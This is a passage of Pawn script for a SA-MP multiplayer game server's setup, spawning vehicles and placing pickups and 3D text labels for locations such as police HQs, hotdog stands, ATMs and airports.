    /*----------------------------------------------------------------------------*///
    AddStaticVehicleEx(466, 1978.4500, 2239.7720, 26.8959, 268.8609, -1, -1, 100);
    //--------------------------------------------------------------------------Planes
    AddStaticVehicleEx(487, 1557.2292, -2631.7034, 13.6891, 0.0000, -1, -1, 100); // airport heli ls 2
    AddStaticVehicleEx(487, 1570.3289, -2631.7034, 13.6891, 0.0000, -1, -1, 100); // airport heli ls 1
    /*----------------------------------------------------------------------------*///
    SetVehicleNumberPlate(AddStaticVehicleEx(473,-1375.77844238,2114.75268555,38.13280487,228.00000000,-1,-1,900), "Boat"); //Barca pe langa hq NR--> LV --> 157
    /*----------------------------------------------------------------------------*/
	TKVeh[0] = AddStaticVehicle(411, 1494.2500, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[0], "TK 001");
	TKVeh[1] = AddStaticVehicle(411, 1494.2500, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[1], "TK 002");
	TKVeh[2] = AddStaticVehicle(411, 1489.2500, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[2], "TK 003");
	TKVeh[3] = AddStaticVehicle(411, 1489.2500, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[3], "TK 004");
	TKVeh[4] = AddStaticVehicle(487, 1445.0000, 2823.0000, 10.9400, -90.0000,0,0); SetVehicleNumberPlate(TKVeh[4], "TK 005");
	TKVeh[5] = AddStaticVehicle(487, 1445.0000, 2836.0000, 10.9400, -90.0000,0,0); SetVehicleNumberPlate(TKVeh[5], "TK 006");
	TKVeh[6] = AddStaticVehicle(487, 1445.0000, 2849.0000, 10.9400, -90.0000,0,0); SetVehicleNumberPlate(TKVeh[6], "TK 007");
	TKVeh[7] = AddStaticVehicle(487, 1445.0000, 2862.0000, 10.9400, -90.0000,0,0); SetVehicleNumberPlate(TKVeh[7], "TK 008");
	TKVeh[8] = AddStaticVehicle(506, 1484.7000, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[8], "TK 009");
	TKVeh[9] = AddStaticVehicle(506, 1479.8000, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[9], "TK 010");
	TKVeh[10] = AddStaticVehicle(506, 1479.8000, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[10], "TK 011");
	TKVeh[11] = AddStaticVehicle(506, 1484.7000, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[11], "TK 012");
	TKVeh[12] = AddStaticVehicle(415, 1475.0000, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[12], "TK 013");
	TKVeh[13] = AddStaticVehicle(415, 1470.2000, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[13], "TK 014");
	TKVeh[14] = AddStaticVehicle(415, 1475.0000, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[14], "TK 015");
	TKVeh[15] = AddStaticVehicle(415, 1470.2000, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[15], "TK 016");
	TKVeh[16] = AddStaticVehicle(409, 1471.4500, 2772.0000, 10.4000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[16], "TK 017");
	TKVeh[17] = AddStaticVehicle(541, 1465.3000, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[17], "TK 018");
	TKVeh[18] = AddStaticVehicle(541, 1460.5000, 2838.5000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[18], "TK 019");
	TKVeh[19] = AddStaticVehicle(541, 1460.5000, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[19], "TK 020");
	TKVeh[20] = AddStaticVehicle(541, 1465.3000, 2848.0000, 10.6000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[20], "TK 021");
	TKVeh[21] = AddStaticVehicle(451, 1478.1000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[21], "TK 022");
	TKVeh[22] = AddStaticVehicle(451, 1482.4000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[22], "TK 023");
	TKVeh[23] = AddStaticVehicle(451, 1486.9000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[23], "TK 024");
	TKVeh[24] = AddStaticVehicle(451, 1491.3000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[24], "TK 025");
	TKVeh[25] = AddStaticVehicle(560, 1495.8000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[25], "TK 026");
	TKVeh[26] = AddStaticVehicle(560, 1500.2000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[26], "TK 027");
	TKVeh[27] = AddStaticVehicle(560, 1504.7000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[27], "TK 028");
	TKVeh[28] = AddStaticVehicle(560, 1509.0000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[28], "TK 029");
	TKVeh[29] = AddStaticVehicle(522, 1474.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[29], "TK 030");
	TKVeh[30] = AddStaticVehicle(521, 1473.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[30], "TK 031");
	TKVeh[31] = AddStaticVehicle(522, 1472.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[31], "TK 032");
	TKVeh[32] = AddStaticVehicle(521, 1471.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[32], "TK 033");
	TKVeh[33] = AddStaticVehicle(522, 1470.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[33], "TK 034");
	TKVeh[34] = AddStaticVehicle(521, 1469.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[34], "TK 035");
	TKVeh[35] = AddStaticVehicle(522, 1468.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[35], "TK 036");
	TKVeh[36] = AddStaticVehicle(521, 1467.0000, 2811.0000, 10.3000, 0.0000,0,0); SetVehicleNumberPlate(TKVeh[36], "TK 037");
	TKVeh[37] = AddStaticVehicle(480, 1513.7000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[37], "TK 038");
	TKVeh[38] = AddStaticVehicle(480, 1518.0000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[38], "TK 039");
	TKVeh[39] = AddStaticVehicle(480, 1522.5000, 2878.7000, 10.6000, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[39], "TK 040");
	TKVeh[40] = AddStaticVehicle(477, 1473.7000, 2878.7000, 10.5400, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[40], "TK 041");
	TKVeh[41] = AddStaticVehicle(477, 1469.2000, 2878.7000, 10.5400, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[41], "TK 042");
	TKVeh[42] = AddStaticVehicle(477, 1464.7000, 2878.7000, 10.5400, 180.0000,0,0); SetVehicleNumberPlate(TKVeh[42], "TK 043");
    /*----------------------------------------------------------------------------*/
    scar = AddStaticVehicleEx(560,2822.7539,-1075.4534,30.4239,180.1004,155,155,1200); // StormMen 218
    scar1 = AddStaticVehicleEx(409,2814.466552,-1089.383789,30.547935,180.835784,155,155,1200); // StormMen 219
    scar2 = AddStaticVehicleEx(560,2822.6890,-1088.4027,30.4240,180.0557,155,155,1200); // StormMen 220
    scar3 = AddStaticVehicleEx(579,2805.3694,-1065.0013,30.4090,179.0163,155,155,1200); // StormMen 221
    scar4 = AddStaticVehicleEx(413,2804.9590,-1109.4777,30.8002,0.0006,155,155,1200); // StormMen 222
    scar5 = AddStaticVehicleEx(521,2797.9109,-1097.3646,30.2847,268.5923,155,155,1200); // StormMen 223
    scar6 = AddStaticVehicleEx(487,2799.168457,-1068.472778,94.363693,88.712821,155,155,1200); // StormMen 224
    /*----------------------------------------------------------------------------*///
    AddStaticVehicleEx(466,2186.45288086,1996.06616211,10.74031258,90.00000000,-1,-1,900); //Glendale LV Car 171
    AddStaticVehicleEx(561,2119.89111328,1916.40917969,10.59587479,179.99993896,-1,-1,900); //Stratum LV Car 172
    AddStaticVehicleEx(603,2074.75219727,1617.91918945,10.67455006,0.00000000,-1,-1,900); //Phoenix LV Car 173
    AddStaticVehicleEx(439,2040.20263672,1368.02807617,10.67187500,179.99993896,-1,-1,900); //Stallion LV Car 174
    AddStaticVehicleEx(585,2141.85595703,1012.90002441,10.51723862,270.00000000,-1,-1,900); //Emperor LV Car 175
    AddStaticVehicleEx(542,1843.86804199,1171.25903320,10.68525600,270.00000000,-1,-1,900); //Clover LV Car 176
    AddStaticVehicleEx(549,2301.90600586,1408.64550781,10.68489075,270.00000000,-1,-1,900); //Tampa LV Car 177
    AddStaticVehicleEx(496,2351.48852539,1447.96997070,20.54981613,90.00000000,-1,-1,900); //Blista Compact LV Car 178
    AddStaticVehicleEx(466,2302.42578125,1518.17102051,29.94343758,0.00000000,-1,-1,900); //Glendale LV Car 179
    AddStaticVehicleEx(542,2309.16040039,1518.15844727,42.66371155,179.99993896,-1,-1,900); //Clover LV Car 180
    AddStaticVehicleEx(561,2305.77880859,1388.93847656,42.74431229,0.00000000,-1,-1,900); //Stratum LV Car 181
    AddStaticVehicleEx(401,2452.10009766,1336.53015137,10.68812752,0.00000000,-1,-1,900); //Bravura LV Car 182
    AddStaticVehicleEx(522,2229.60009766,1417.16088867,10.72287750,270.00000000,-1,-1,900); //NRG-500 LV Moto 183
    bulletlight1 = CreateObject(19420, 0, 0, 0, 0, 0, 0, 0.0);
    bulletlight2 = CreateObject(19420, 0, 0, 0, 0, 0, 0, 0.0);
    bulletneon1 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    bulletneon2 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
   bullettext1 = CreateObject(19326, 0, 0, 0, 0, 0, 0, 0.0);
    bullettext2 = CreateObject(19326, 0, 0, 0, 0, 0, 0, 0.0);
   SetObjectMaterialText(bullettext1, "POLICE", 0, OBJECT_MATERIAL_SIZE_512x512,"Impact", 230, 0, 0xFF000000, false, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);// be false dast nazan doroste ( khodamam shansi gozashtam!!!!! :O hame too in moondan!(gheir az bazia ke lo nemidan :P)
    SetObjectMaterialText(bullettext2, "POLICE", 0, OBJECT_MATERIAL_SIZE_512x512,"Impact", 230, 1, 0xFF000000, false, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
   AttachObjectToVehicle(bulletlight1, FBIVeh[13], 0.0433, -0.2661, 0.6266,0.0000, 0.0000, 0.0000);
    AttachObjectToVehicle(bulletlight2, FBIVeh[14], 0.0433, -0.2661, 0.6266,0.0000, 0.0000, 0.0000);
    AttachObjectToVehicle(bullettext1,FBIVeh[13],-0.0022, -1.6872, 0.3867,78.0000, 0.0000, 180.0000);
    AttachObjectToVehicle(bullettext2,FBIVeh[14],-0.0022, -1.6872, 0.3867,78.0000, 0.0000, 180.0000);
 //   light = CreateObject(19420, 0, 0, 0, 0, 0, 0, 0.0); //police red and blue light
 //   light2 = CreateObject(19420, 0, 0, 0, 0, 0, 0, 0.0); //police red and blue light
    light3 = CreateObject(19420, 0, 0, 0, 0, 0, 0, 0.0); //police red and blue light
    light4 = CreateObject(19420, 0, 0, 0, 0, 0, 0, 0.0); //police red and blue light
    light5 = CreateObject(19420, 0, 0, 0, 0, 0, 0, 0.0); //police red and blue light
    neon1 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	neon2 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	neon3 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	neon4 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	neon5 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	neon6 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
	neon7 = CreateObject(19419, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    new neveshtepolice1 = CreateObject(19326, 0, 0, 0, 0, 0, 0, 0.0);
    new neveshtepolice2 = CreateObject(19326, 0, 0, 0, 0, 0, 0, 0.0);
    new neveshtepolice3 = CreateObject(19326, 0, 0, 0, 0, 0, 0, 0.0);
    new neveshtepolice4 = CreateObject(19326, 0, 0, 0, 0, 0, 0, 0.0);
    new neveshtepolice5 = CreateObject(19326, 0, 0, 0, 0, 0, 0, 0.0);
    SetObjectMaterialText(neveshtepolice1, "POLICE", 0, OBJECT_MATERIAL_SIZE_512x512,"Impact", 230, 0, 0xFF000000, false, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);// be false dast nazan doroste ( khodamam shansi gozashtam!!!!! :O hame too in moondan!(gheir az bazia ke lo nemidan :P)
    SetObjectMaterialText(neveshtepolice2, "POLICE", 0, OBJECT_MATERIAL_SIZE_512x512,"Impact", 230, 1, 0xFF000000, false, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);// be false dast nazan doroste ( khodamam shansi gozashtam!!!!! :O hame too in moondan!(gheir az bazia ke lo nemidan :P)
    SetObjectMaterialText(neveshtepolice3, "POLICE", 0, OBJECT_MATERIAL_SIZE_512x512,"Impact", 230, 2, 0xFF000000, false, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);// be false dast nazan doroste ( khodamam shansi gozashtam!!!!! :O hame too in moondan!(gheir az bazia ke lo nemidan :P)
    SetObjectMaterialText(neveshtepolice4, "POLICE", 0, OBJECT_MATERIAL_SIZE_512x512,"Impact", 230, 3, 0xFF000000, false, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);// be false dast nazan doroste ( khodamam shansi gozashtam!!!!! :O hame too in moondan!(gheir az bazia ke lo nemidan :P)
    SetObjectMaterialText(neveshtepolice5, "POLICE", 0, OBJECT_MATERIAL_SIZE_512x512,"Impact", 230, 4, 0xFF000000, false, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);// be false dast nazan doroste ( khodamam shansi gozashtam!!!!! :O hame too in moondan!(gheir az bazia ke lo nemidan :P)
     AttachObjectToVehicle(light3, CopLSVeh[22], 0, 0, 0.7, 0, 0, 0);
    AttachObjectToVehicle(light4, CopLSVeh[23], 0, 0, 0.7, 0, 0, 0);
    AttachObjectToVehicle(light5, CopLSVeh[24], 0, 0, 0.7, 0, 0, 0);
    AttachObjectToVehicle(neveshtepolice3, CopLSVeh[22], 0, -1.9639, 0.2548, 90.0000, 180.0000, 0.0000);
    AttachObjectToVehicle(neveshtepolice4, CopLSVeh[23], 0, -1.9639, 0.2548, 90.0000, 180.0000, 0.0000);
    AttachObjectToVehicle(neveshtepolice5, CopLSVeh[24], 0, -1.9639, 0.2548, 90.0000, 180.0000, 0.0000);
    taxiicon1 = CreateObject(19308,0, 0, 0, 0, 0, 0, 0.0);
    taxiicon2 = CreateObject(19308,0, 0, 0, 0, 0, 0, 0.0);
    AttachObjectToVehicle(taxiicon1, TaxVeh[17], 0, -0.2, 0.92, 0, 0, 0);
    AttachObjectToVehicle(taxiicon2, TaxVeh[18], 0, -0.2, 0.92, 0, 0, 0);
    CreatePickup(1239, 1, 1607.520996,1815.756591,10.820312,0);//medic hq 
    CreatePickup(1239, 1, 1808.0897,-1599.5748,13.5469,0)
    CreatePickup(1239, 1, -329.770111,1536.920532,76.611709, 0);//News Reporter HQ PickUp.
    for(new i = 0;i<3;i++)
    {
        CreatePickup(1247, 1, 236.390625,109.871276,1003.225708,i);//duty
        CreatePickup(1239, 1, 244.331329,118.533126,1003.218750,i);//equip
    }
    CreatePickup(1247, 1, 236.390625,109.871276,1003.225708,100074);//duty sfpd
    CreatePickup(1239, 1, 244.331329,118.533126,1003.218750,100074);//equip sfpd
	CreatePickup(1239, 1, 193.368545,1931.499145,17.640625,1020304050);//equip sfpd
	CreatePickup(1239, 1,1470.5006,-1177.0256,23.9266,0);


    CreatePickup(1239, 1, 1761.950073,-1542.098510,1993.670043,10);//Jail Control Panel
	CreatePickup(1239, 1, 1762.053588,-1564.047119,2001.460449,10);//Jail Yard Control Panel
	CreatePickup(1239, 1, 193.368545, 1931.499145, 17.640625,10);//Jail Yard
    CreatePickup(1239, 1, 2077.161376,-2006.656250,13.546875,0);//Garbage getjob
    CreatePickup(1239, 1, -196.126205,2659.945556,62.839744,0);//hotdog place 
    CreatePickup(1239, 1, 1374.7749,-1043.2682,26.4704,0)
    CreatePickup(1239, 1, -1375.8477,-1044.9393,26.8763,0)
    CreatePickup(1239, 1, -2147.457031,-424.305725,35.335937,0);//hotdog place sf
    CreatePickup(1239, 1, -2690.852050,383.803985,4.374998,0);//hotdog place sf
    CreatePickup(1239, 1, 1612.7501,-1839.9008,13.5223,0);

    CreatePickup(1239, 1, 1481.0206,-1771.1138,18.7958,0); //City Hall LS
   // CreatePickup(1239, 1, 1641.388671,-2177.379638,13.554687,0);//Exam pickup
    CreatePickup(1239, 1, 362.0605,173.7425,1008.3828,55); ///lawyer (ok )
    CreatePickup(1239, 1, 359.5408,206.7693,1008.3828,55);///detective (ok )
    CreatePickup(1239, 1, -382.6660,-1426.5121,26.2410,0); // Farmer job pickup
    CreatePickup(1239, 1, -1061.110107,-1195.576660,129.728820,0);//farmer job pickup 2
    CreatePickup(1239, 1, 2802.8596,2430.6089,11.0625,0);//Victim LV
    CreatePickup(1239, 1, 1554.9537,-1675.6584,16.1953,0);//PD Building
    CreatePickup(1239, 1, 2770.6973,-1628.4293,12.1775,0); //materials get pickup
    CreatePickup(1239, 1, 1570.3828,-1333.8882,16.4844,0); // LS TOWER /enter
    //take jobs
    CreatePickup(1239, 1, 1658.4885,2199.7075,10.8203,0);//car mechanic takejob
    CreatePickup(1239, 1, 2440.481201,-1970.118164,13.546875,0);//Arms Dealer takejob
    //HQS Pickups
    CreatePickup(1239, 1, 1122.7065,-2037.0063,69.8942,0); // LegendaryMen hq entrance
    CreatePickup(1239, 1, 2560.805175,1561.846069,10.820312,0);//Staff HQ Pickup
    CreatePickup(1239, 1, 2232.425537,-1159.585205,25.890625,0);//TT HQ Pickup
	CreatePickup(1239, 1, 2140.929199,-1801.968017,16.147472,0);//Evil HQ Pickup
    CreatePickup(1239, 1, 2235.440429,-1184.549194,33.531250,0);//TT Bala Pickup
    CreatePickup(1239, 1, 2218.994628,-1179.321777,25.890625,0);//TT Bala Pickup
    CreatePickup(1239, 1, 1653.836059,-1654.757690,22.515625,0);//GG HQ Pickup (Edit)
    CreatePickup(1239, 1, 1649.305664,-1656.475585,22.515625,0);//GG Bala Pickup (Edit)
    CreatePickup(1239, 1, 1654.223388,-1643.526855,83.781250,0);//GG Paein Pickup (Edit)
    CreatePickup(1239, 1, 1649.305664,-1656.475585,22.515625,0);//SFPD Bala Pickup (Edit)
    CreatePickup(1239, 1, -1606.268066,672.061706,-4.906250,0);//SFPD Paein Pickup (Edit)
    CreatePickup(1239, 1, -1639.474853,716.886535,48.937500,0);//Storm Bala Pickup (Edit)
    CreatePickup(1239, 1, 2793.181152,-1080.431518,30.718750,0);//Storm Paein Pickup (Edit)
    CreatePickup(1239, 1, 2637.4326,2352.0256,10.8203,0); // DangerousTigers Family HQ
    CreatePickup(1239, 1, 725.5550,-1451.0232,17.6953,0); //Silence Mafia HQ
    CreatePickup(1239, 1, 1456.7424,2773.4614,10.8203,0);//HQ The Killers entrace
    CreatePickup(1239, 1, 1455.4546,750.9794,11.0234,0);//HQ FNF
    CreatePickup(1239, 1, 2792.800292, -1087.528320, 30.718750, 0);//StormMen
    CreatePickup(1239, 1, -2720.359619, -318.036743, 7.843750, 0);//The Racers
    CreatePickup(1239, 1, 1615.0603,1815.7771,10.8203,0); // HQ Medic pickup /goup heli
    CreatePickup(1239, 1, 1607.4210,1787.6932,30.4688,0); //HQ meci pickup /godown heli
    CreatePickup(1239, 1, 2287.0576,2432.1121,10.8203,0);//FBI HQ ENTER
    CreatePickup(1239, 1, 1080.997192,-345.408233,73.984069,0);//hq hitman entrance
    CreatePickup(1239, 1, 960.3047,1784.0295,8.8516,0);//Taxi Up Two
    CreatePickup(1239, 1, 946.0334,1790.6084,15.7941,0);//Taxi Down Two
    //Hotdog/ATM
    CreatePickup(1239, 1, 2327.5669,2420.0872,10.8203,0);//hotdog place
    CreatePickup(1239, 1, 2536.7705,2137.3352,10.8203,0);//hotdog place
    CreatePickup(1239, 1, 1589.4072,-1288.5424,17.5171,0);// place
    //CreatePickup(1239, 1, 2536.9187,2154.1409,10.8203,0);//icecram place
    //CreatePickup(1239, 1, 2125.5737,1443.1979,10.8203,0);//icecram place
    CreatePickup(1239, 1, 2144.3965,1440.8734,10.8203,0);//hotdog place
    CreatePickup(1239, 1, 1543.6354,-1697.5503,13.5469,0);//hotdog place
    CreatePickup(1239, 1, 1803.9893,-1861.9354,13.5769,0);//hotdog place
    //CreatePickup(1239, 1, 1797.2557,-1861.9456,13.5769,0);//icecram place
    //CreatePickup(1239, 1, 2294.5654,2250.4661,10.8203,0);//Icecream place
    CreatePickup(1239, 1, 999.8986,-1850.0149,12.8146,0);//hotdog place
    //CreatePickup(1239, 1, 760.8732,-1678.4325,4.1114,0);//icecram place
    CreatePickup(1239, 1, 760.2253,-1670.2555,4.1461,0);//hotdog place
    CreatePickup(1239, 1, 730.190124,-1267.223022,13.553401,0);//hotdog place
    CreatePickup(1239, 1, 388.5802,-2072.7168,7.8359,0);//hotdog place.
    CreatePickup(1239, 1, 723.021606,-1300.209594,13.569027);//hotdog place
    CreatePickup(1239, 1, 1009.2220,-929.6009,42.3281,0);//ATM
    CreatePickup(1239, 1, 603.6191,-1247.6931,18.4213,0);//ATM
    CreatePickup(1239, 1, 2173.2356,1417.4757,11.0625,0);//ATM
    CreatePickup(1239, 1, 1739.4116,-1862.9391,13.5757,0);//ATM
    //-------------------------------------------------------------------------------------
    CreatePickup(1239, 1, 1712.9865,913.2946,10.8203,0);//Materials Deliver
    CreatePickup(1239, 1, 329.8260,-1516.1796,35.8671,0); //Dealership
    CreatePickup(1239, 1, 1541.300170,-1360.734619,329.460815,0);//Tower /exit
    //==================================[eat places]===========================
    /*for(new i = 0;i<70;i++)
    {
        CreatePickup(1239, 1, 368.9714,-6.2486,1001.8516,i);
        CreatePickup(1239, 1, 376.8571,-67.6620,1001.5151,i);
        CreatePickup(1239, 1, 375.6895,-118.9683,1001.4995,i);
        CreatePickup(1239, 1, 379.0611,-186.6032,1000.6328,i);
    }*/
    //=============[taxi]=======================
    CreatePickup(1239, 1, 937.3935,1733.2067,8.8516,0);
    CreatePickup(1239, 1, 2515.572265,-1473.751220,24.009740,0);//getjob carjacker
    CreatePickup(1239, 1, 1765.061889,-2031.958862,14.048107,0);//getjob busdriverls
    CreatePickup(1239, 1, 1909.430297,2351.376453,10.979915,0);//getjob busdriverlv
    //===========[trucker]================
    CreatePickup(1239, 1, -77.235397,-1136.455932,1.078125,0);//getjob Trucker
    CreatePickup(1239, 1, 1524.7275,-1677.5446,5.8906,0);//LSPD Armoury
    CreatePickup(1239, 1, 1524.7275,-1677.5446,5.8906,0);//SFPD Armoury // SFPD EDIT //
    CreatePickup(1239, 1, 242.3151,66.3457,1003.6406,0); // /pddown
    CreatePickup(1239, 1, 1797.442504,-1578.950683,14.085444,0);
	// Travel System Picks
	CreatePickup(1239, 1, 1642.231689,-2237.691894,13.498592,0);//LS
	CreatePickup(1239, 1, 1662.839599,1423.421752,10.798387,0);//LV
	CreatePickup(1239, 1, -1421.201171,-287.120727,14.148437,0);//SF
	// EnD Travel  Picks
    //---------------------------------------------------------------------------
    JailGate3D = CreateDynamic3DTextLabel("Gate\n use /opengate or /og to open this gate.",COLOR_WHITE,1778.161865,-1543.112182,2001.300415,10.0);
    CreateDynamic3DTextLabel("Jail Door\n use /enter to enter\n((COP ONLY))",COLOR_WHITE,1769.327392,-1542.691162,2001.300415,10.0);
    CreateDynamic3DTextLabel("Jail\n Type /enter to enter", COLOR_WHITE,1797.442504,-1578.950683,14.085444,10.0);
    CreateDynamic3DTextLabel("LS TOWER\n Type /exit to exit", COLOR_WHITE,1541.300170,-1360.734619,329.460815,10.0);
    CreateDynamic3DTextLabel("LS TOWER\n Type /enter to enter", COLOR_WHITE,1570.3828,-1333.8882,16.4844,10.0);
    CreateDynamic3DTextLabel("Welcome to {57e547} JoKeR GaminG {FFFFFF} Dealer shop You Can Buy Vehicle's \n Type /BuyCar See Vehicle List",COLOR_WHITE,329.8260,-1516.1796,35.8671,10.0);
    CreateDynamic3DTextLabel("Los Santos City Hall \nType: /enter to enter",COLOR_GRAD4,1481.0206,-1771.1138,18.7958,10.0);//Los Santos City Hall
    CreateDynamic3DTextLabel("Aber Bank System\nType /AtmWithdraw Baraie Bardasht Az Hesab",COLOR_GRAD4,1739.4116,-1862.9391,13.5757,10.0);//
    CreateDynamic3DTextLabel("Aber Bank System\nType /AtmWithdraw Baraie Bardasht Az Hesab",COLOR_GRAD4,1009.2220,-929.6009,42.3281,10.0);//
    CreateDynamic3DTextLabel("Aber Bank System\nType /AtmWithdraw Baraie Bardasht Az Hesab",COLOR_GRAD4,603.6191,-1247.6931,18.4213,10.0);//
    CreateDynamic3DTextLabel("Aber Bank System\nType /AtmWithdraw Baraie Bardasht Az Hesab",COLOR_GRAD4,2173.2356,1417.4757,11.0625,10.0);//
	CreateDynamic3DTextLabel("DJ System\n/Dj",0x008080FF,476.1023,-14.9819,1003.6953,5.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,0,17,-1,5.0);
	CreateDynamic3DTextLabel("Aber Bank System\nType /AtmWithdraw Baraie Bardasht Az Hesab",COLOR_GRAD4,603.6191,-1247.6931,18.4213,10.0);//
    	CreateDynamic3DTextLabel("TelePhone Sabet /Pcall",COLOR_GRAD4,1808.0897,-1599.5748,13.5469,10.0);
    	
    new lolst[80];
    format(lolst, 80, "{FFFFFF}Hotdog Place \nType: {57e547}/hotdog {FFFFFF}to eat \n Cost: {00FFFF}$%i", SBizzInfo[21][sbEntranceCost]);
    hotdog[0] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,2144.3965,1440.8734,10.8203,10.0);//
    hotdog[1] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,1543.6354,-1697.5503,13.5469,10.0);//
    hotdog[2] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,1803.9893,-1861.9354,13.5769,10.0);//
    hotdog[3] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,-196.126205,2659.945556,62.839744,10.0);
    hotdog[4] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,999.8986,-1850.0149,12.8146,10.0);//
    hotdog[5] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,760.2253,-1670.2555,4.1461,10.0);//
    hotdog[6] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,388.5802,-2072.7168,7.8359,10.0);//
    hotdog[7] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,2327.5669,2420.0872,10.8203,10.0);//
    hotdog[8] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,2536.7705,2137.3352,10.8203,10.0);//
    hotdog[9] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,1589.4072,-1288.5424,17.5171,10.0);//
    hotdog[10] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,730.190124,-1267.223022,13.553401,10.0);//
    hotdog[11] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,-2147.457031,-424.305725,35.335937,10.0);//
    hotdog[12] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4,-2690.852050,383.803985,4.374998,10.0);// //CreatePickup(1239, 1, 1375.8477,-1044.9393,26.8763,0)
    hotdog[12] = CreateDynamic3DTextLabel(lolst,COLOR_GRAD4, 1374.7749,-1043.2682,26.4704,10.0);
    Trash[0] = CreateDynamic3DTextLabel("Satl Ashghal  {ffffff}/begard",0x008080FF, 1828.5535,-1143.6344,23.9121,247.3952);
    Trash[2] = CreateDynamic3DTextLabel("Satl Ashghal {ffffff}/begard",0x008080FF, 1829.5398,-1084.1140,23.8812,276.2088);
    Trash[3] = CreateDynamic3DTextLabel("Satl Ashghal {ffffff}/begard",0x008080FF, 1829.4103,-1114.2440,23.8804,278.0367);
    //CreateDynamic3DTextLabel("{f92509}JokerGaminG{1bf40c} DealerShip {ffffff}/SVeh",0x008080FF, 1470.5006,-1177.0256,23.9266,278.0367);
	//----
	// Travel System Texts

	CreateDynamic3DTextLabel("Airport Los Santos\n Type : /buyticket For Travel",COLOR_GRAD4,1642.231689,-2237.691894,13.498592,10.0);//LS
	CreateDynamic3DTextLabel("Airport Las Vanturas\n Type : /buyticket For Travel",COLOR_GRAD4,1662.839599,1423.421752,10.798387,10.0);//LV
	CreateDynamic3DTextLabel("Airport San Fiero\n Type : /buyticket For Travel",COLOR_GRAD4,-1421.201171,-287.120727,14.148437,10.0);//SF


	// EnD Travel
    CreateDynamic3DTextLabel("Victim\n Type: /enter to enter",COLOR_GRAD4,2802.8596,2430.6089,11.0625,10.0);//Victim LV
    //HQs
